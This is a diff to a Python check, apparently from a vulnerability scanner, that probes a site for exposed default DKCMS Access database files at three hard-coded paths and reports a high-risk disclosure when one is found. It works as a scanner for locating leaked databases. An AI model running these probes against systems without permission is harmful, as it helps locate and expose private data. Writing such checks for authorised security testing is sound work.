@@ -28,15 +28,20 @@ class dkcms_database_disclosure_BaseVerify:
         payloads = ["/data/dkcm_ssdfhwejkfs.mdb",
                     "/_data/___dkcms_30_free.mdb",
                     "/_data/I^(()UU()H.mdb"]
-        for payload in payloads:
-            vulnurl = self.url + payload
-            try:
+
+        try:
+            noexist = True
+            for payload in payloads:
+                vulnurl = self.url + payload
                 req = requests.head(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.headers["Content-Type"] == "application/x-msaccess":
                     cprint("[+]存在dkcms默认数据库漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在dkcms_database_disclosure漏洞", "white", "on_grey")
 
-            except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+        except:
+                cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
